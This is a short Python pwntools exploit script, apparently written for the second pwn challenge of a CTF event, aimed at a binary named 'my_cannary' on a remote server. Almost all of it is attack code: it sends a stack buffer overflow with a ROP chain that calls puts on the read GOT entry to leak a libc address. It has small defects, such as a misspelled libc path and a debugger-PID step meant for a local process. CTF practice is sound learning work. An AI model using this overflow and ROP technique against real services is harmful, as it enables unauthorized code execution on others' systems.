# _*_ coding:utf-8 _*_

'''
CXY_CTF     PWN第二题
'''

from pwn import *
import os
import struct
import random
import time
import sys
import signal


def clear(signal=None, Stack=None):
    print('Strip all debugging information')
    os.system('rm -f /tmp/gdb_symbols* /tmp/gdb_pid /tmp/gdb_script')
    exit(0)


for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]:
    signal.signal(sig, clear)

context.arch = 'amd64'
context.log_level = 'debug'
execve_file = './my_cannary'

sh = remote('183.129.189.60', 10026)
elf = ELF(execve_file)

libc = ELF('/lib/x86_64-linux-gun/libc.so.6')


gdbscript = '''
b *0x400976
b check
'''

with open('/tmp/gdb_pid', 'w') as f:
    f.write(str(proc.pidof(sh)[0]))

with open('/tmp/gdb_script', 'w') as f:
    f.write(gdbscript)

sh.recvuntil('Now let\'s begin\n')
pause()
layout = [
    0x0000000000400a43,
    elf.got['read'],
    elf.plt['puts'],
    elf.symbols['test'],
]

sh.send('a' * 0x30 + p64(elf.bss() + 0x100) +
        p64(0) + 'b' * 0x8 + flat(layout))

sh.interactive()
clear()
